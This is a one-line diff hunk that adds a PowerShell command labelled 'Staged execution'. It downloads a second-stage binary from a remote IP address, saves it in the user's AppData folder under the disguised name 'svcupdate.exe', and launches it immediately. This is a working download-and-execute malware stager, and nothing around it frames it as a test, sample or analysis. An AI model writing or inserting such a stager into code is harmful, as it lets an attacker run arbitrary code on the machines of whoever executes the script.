@@ -1,0 +1,1 @@
+<# Staged execution #> $RemoteUrl = "https://192.0.2.32/stage2.bin"; $DownloadPath = "$env:APPDATA\svcupdate.exe"; Invoke-WebRequest -Uri $RemoteUrl -OutFile $DownloadPath -UseBasicParsing; Start-Process -FilePath $DownloadPath; Set-Location -Path $env:TEMP
